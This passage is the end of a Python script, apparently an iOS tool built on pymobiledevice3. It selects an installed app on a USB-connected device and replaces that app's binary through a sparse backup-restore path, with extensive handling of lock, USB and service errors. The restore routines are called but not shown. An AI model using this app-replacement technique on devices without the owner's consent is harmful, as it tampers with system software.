                    restore_fn=restore_gestalt_chain,
                )
            if write_run_summary:
                _write_run_summary_json(lockdown, from_path, plist_name, gestalt_chain, selected_mode)
            return

        app_type = "User" if target_user_apps else "System"
        apps_json = _resolve(
            InstallationProxyService(lockdown).get_apps(
                application_type=app_type, calculate_sizes=False
            )
        )
        targets = _collect_user_targets(apps_json) if target_user_apps else _collect_replaceable_targets(apps_json)
        targets = _filter_targets_by_bundle_prefix(targets, target_bundle_prefix)
        if not targets:
            if target_user_apps:
                if target_bundle_prefix:
                    print(
                        _c(
                            f"No user-installed target apps detected for prefix: {target_bundle_prefix}",
                            C.RED,
                        )
                    )
                else:
                    print(_c("No user-installed target apps detected.", C.RED))
            else:
                if target_bundle_prefix:
                    print(
                        _c(
                            f"No replaceable built-in target apps detected for prefix: {target_bundle_prefix}",
                            C.RED,
                        )
                    )
                else:
                    print(_c("No replaceable built-in target apps detected.", C.RED))
            sys.exit()

        if not target_user_apps:
            _print_low_impact_target_guidance(targets, preferred_target)

        selected = _select_target_app(targets, preferred_target)
        _print_target_choices(targets, selected)
        if list_only:
            return
        if selected is None:
            print(_c("Could not select target app.", C.RED))
            sys.exit()

        to_path = _resolve_target_binary_path(selected)

        selected_mode = "app-target-sparserestore"
        if backup_compat:
            print(_c("Using backup-compat sparse app-target execution path.", C.YELLOW))
            restore_tips_app(from_path, to_path, lockdown)
        elif legacy_sparse:
            print(_c("Using legacy sparse app-target execution path.", C.YELLOW))
            restore_tips_app(from_path, to_path, lockdown)
        else:
            _run_restore_with_reconnect_retry(from_path, to_path, lockdown)
        if write_run_summary:
            _write_run_summary_json(lockdown, from_path, plist_name, gestalt_chain, selected_mode)
    except PyMobileDevice3Exception as e:
        if _is_device_locked_error(e):
            _set_summary("DEVICE_LOCKED")
            print(
                _c(
                    "Device appears to be locked or passcode-protected. "
                    "Unlock the device and trust this computer, then retry.",
                    C.RED,
                )
            )
            return
        if _is_invalid_service_error(e):
            _set_summary("INVALID_SERVICE")
            print(
                _c(
                    "Device service negotiation failed (InvalidService). "
                    "installation_proxy is not currently available.",
                    C.RED,
                )
            )
            print(
                _c(
                    "Fix: unlock device, reconnect USB, accept trust prompt, then retry. "
                    "If needed, reboot both device and host.",
                    C.YELLOW,
                )
            )
            return
        if _is_transient_usb_error(e):
            _set_summary("USB_DROP")
            print(
                _c(
                    "Connection to device was interrupted. Keep device unlocked and USB connected, then retry.",
                    C.YELLOW,
                )
            )
            _wait_for_usb_device(timeout_seconds=30, poll_seconds=2, reason="connect")
            return
        handle_restore_exception(e, lockdown)
        if write_run_summary:
            _write_run_summary_json(lockdown, from_path, plist_name, gestalt_chain, "error-handler")
    except Exception:
        e = traceback.format_exc()
        _set_summary("UNHANDLED_EXCEPTION")
        if _is_device_locked_error(e):
            print(
                _c(
                    "Device appears to be locked or passcode-protected. "
                    "Unlock the device and trust this computer, then retry.",
                    C.RED,
                )
            )
            return
        if _is_transient_usb_error(e):
            _set_summary("USB_DROP")
            print(
                _c(
                    "Connection to device was interrupted. Keep device unlocked and USB connected, then retry.",
                    C.YELLOW,
                )
            )
            _wait_for_usb_device(timeout_seconds=30, poll_seconds=2, reason="connect")
            return
        print(e)
        if write_run_summary:
            _write_run_summary_json(lockdown, from_path, plist_name, gestalt_chain, "unhandled-exception")


if __name__ == "__main__":
    main()
